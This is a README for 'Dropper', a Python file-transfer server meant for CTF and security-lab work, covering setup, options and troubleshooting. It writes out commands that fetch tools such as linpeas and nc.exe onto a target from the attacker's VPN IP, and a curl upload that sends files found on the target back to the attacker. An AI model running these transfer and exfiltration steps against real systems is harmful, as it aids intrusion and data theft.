# Dropper

A small web server for moving files during a CTF or security lab.

You run it on your own machine and point it at a folder. The machine you are
working on can then download files from that folder using `wget` or `curl`, and
if you turn uploads on, it can send files back to you.

There is nothing to install. It uses only Python 3, which is already on Kali and
most Linux systems.

## What it is for

When you are on a box, you often need to get a tool onto it (like a privilege
escalation script), or pull a file off it (like something you found). The usual
way is to start a quick web server on your machine and use `wget` on the box.
This script is that web server, with a few helpful extras:

- it finds your VPN IP for you and listens on it, so the box can reach you
- it prints the exact `wget`/`curl` command to run, with your IP already filled in
- you can download a file by just its name, even if it is in a sub-folder
- you can let the box send files back to you, with some safety limits

## Requirements

- Python 3 (check with `python3 --version`)
- A VPN connection (usually your `tun0` connection)

## Quick start

1. Put the tools you want to share in a folder, for example `~/ctf/tools`.
2. Start the server:

   ```bash
   python3 dropper.py --dir ~/ctf/tools
   ```

3. It prints your VPN IP and the commands to run on the box. It looks like this:

   ```
   dropper  · file dropper
   serving  /home/you/ctf/tools  3 files
   listen   http://10.10.14.5:8000
   uploads  off

   hosting
   ├── linux/
   │   └── pspy64  3.0M
   └── linpeas.sh  800K

   on target
     wget http://10.10.14.5:8000/FILENAME
     curl -O http://10.10.14.5:8000/FILENAME
   ```

Press `Ctrl-C` to stop it.

## Downloading a file onto the box

On the box you are working on, run one of these (use the IP the server printed):

```bash
wget http://10.10.14.5:8000/linpeas.sh
curl -O http://10.10.14.5:8000/linpeas.sh
```

You only need the file name. The server looks inside sub-folders for you, so
`linpeas.sh` works even if the file is actually in `tools/linux/linpeas.sh`.

### Downloading by exact path with /dl/

Instead of a bare name, you can ask for a file by its exact path using `/dl/`.
The part after `/dl/` is the path to the file, starting from the folder you are
sharing. For example, if you are sharing `~/ctf/tools` and the file is at
`~/ctf/tools/windows/nc.exe`, you would run:

```bash
curl -O http://10.10.14.5:8000/dl/windows/nc.exe
```

You mainly need this when two files have the same name in different folders. A
bare name like `/nc.exe` would grab whichever one it finds first, so `/dl/` lets
you point at the exact one you want. For everything else, the bare name is
easier.

## Seeing what is being shared

```bash
curl http://10.10.14.5:8000/            # list the top folder
curl http://10.10.14.5:8000/?path=linux # list a sub-folder
```

## Sending a file back to yourself

This is off by default. Start the server with `--upload` to turn it on:

```bash
python3 dropper.py --dir ~/ctf/tools --upload
```

Then, from the box, send a file back:

```bash
curl -T found.txt http://10.10.14.5:8000/up/
```

The file is saved in a folder called `dropper-loot`, next to the folder you are
sharing. It is kept separate on purpose, so files you pull back are not shared
out again to anyone else.

## Options

| Option | What it does |
|---|---|
| `--dir FOLDER` | The folder to share (default: the current folder) |
| `--host IP` | The IP to listen on (default: your VPN IP, found automatically) |
| `--port NUMBER` | The port to listen on (default: 8000) |
| `--iface NAME` | Your VPN connection name (default: tun0) |
| `--upload` | Allow the box to send files back to you |
| `--upload-dir FOLDER` | Where sent-back files are saved (default: a `dropper-loot` folder) |
| `--max-upload SIZE` | Largest file the box may send back, such as `20M` (max and default: 50M) |
| `--upload-from IP` | Only allow these IPs to send files back (comma-separated) |

You can always see this list with:

```bash
python3 dropper.py --help
```

## An example

Share your tools, and only allow the box you are attacking to send files back:

```bash
python3 dropper.py --dir ~/ctf/tools --upload --upload-from 10.10.10.5
```

## Things worth knowing

- **There is no password.** Anyone who can reach your VPN IP can download from
  you. For public tools like `linpeas` that is fine. Just do not share anything
  private this way.
- **On a shared VPN you are on the same network as other people.** That is why the
  upload side has limits: files from the box are capped in size, saved to a
  separate folder, and you can lock uploads to a single IP with `--upload-from`.
- **Turn uploads on only when you need them.** Start with `--upload` just for the
  moment you are pulling a file back, then stop the server. That is the simplest
  way to keep other people from sending you things.
- **Files sent to you are just saved, not run.** The server never runs anything.
  Still, treat a file you pulled off a box as untrusted: look at it, do not run it.

## Common problems

- **The box cannot reach you.** Check your VPN is up. The IP the server lists
  should be your `tun0` address. If it says `(no tun0)`, your VPN is probably down.
- **It says "no tun0" and uses a different address.** It could not find your VPN,
  so it listened on everything. Connect the VPN and restart, or pass your IP with
  `--host`.
- **The box can only reach port 80 or 443.** Some boxes block other ports. Run it
  on port 80 (this needs `sudo`):

  ```bash
  sudo python3 dropper.py --dir ~/ctf/tools --port 80
  ```

- **`python3: command not found`.** Try `python` instead of `python3`.
